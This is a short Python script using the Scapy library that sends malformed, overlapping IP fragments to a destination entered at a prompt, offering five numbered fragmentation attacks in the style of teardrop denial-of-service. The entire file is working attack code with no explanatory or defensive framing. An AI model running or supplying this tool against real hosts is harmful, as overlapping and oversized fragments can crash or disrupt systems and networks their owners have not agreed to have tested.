
import sys
from scapy.all import *


def atk1(target):
  print ("Using attack 1")
  size=36
  offset=3
  load1="\x00"*size
  
  i=IP()
  i.dst=target
  i.flags="MF"
  i.proto=17
  
  size=4
  offset=18
  load2="\x00"*size

  j=IP()
  j.dst=target
  j.flags=0
  j.proto=17
  j.frag=offset

  send(i/load1)
  send(j/load2)

def atk2(target):
  print ("Using attack 2")
  size=1300
  offset=80
  load="A"*size
  
  i=IP()
  i.dst=target
  i.flags="MF"
  i.proto=17
  
  j=IP()
  j.dst=target
  j.flags=0 
  j.proto=17
  j.frag=offset
  
  send(i/load)
  send(j/load)

def atk3(target):
  print ("Using attack 3")
  print ("Attacking with attack 3")
  size=1300
  offset=80
  load="A"*size
  
  i=IP()
  i.dst=target
  i.proto=17
  i.flags="MF"
  i.frag=0
  send(i/load)

  print ("Attack 3 packet 0")
  
  for x in range(1, 10):
    i.frag=offset
    offset=offset+80
    send(i/load)
    print ("Attack 3 packet " + str(x))
  
  i.frag=offset
  i.flags=0
  send(i/load)

def atk4(target):
  print ("Using attack 4")
  size=1336
  offset=3
  load1="\x00"*size
  
  i=IP()
  i.dst=target
  i.flags="MF"
  i.proto=17
  
  size=4
  offset=18
  load2="\x00"*size
  
  j=IP()
  j.dst=target
  j.flags=0
  j.proto=17
  j.frag=offset
  
  send(i/load1)
  send(j/load2)

def atk5(target):
  print ("Using attack 5")
  size=1300
  offset=10
  load="A"*size
  
  i=IP()
  i.dst=target
  i.flags="MF"
  i.proto=17
  
  j=IP()
  j.dst=target
  j.flags=0
  j.proto=17
  j.frag=offset
  
  send(i/load)
  send(j/load)

dest, atkcode = str(input('destination and attack code: ')).lower().split(' ', 1)

if atkcode == '1':
  atk1(dest)
elif atkcode == '2':
  atk2(dest)
elif atkcode == '3':
  atk3(dest)
elif atkcode == '4':
  atk4(dest)
elif atkcode == '5':
  atk5(dest)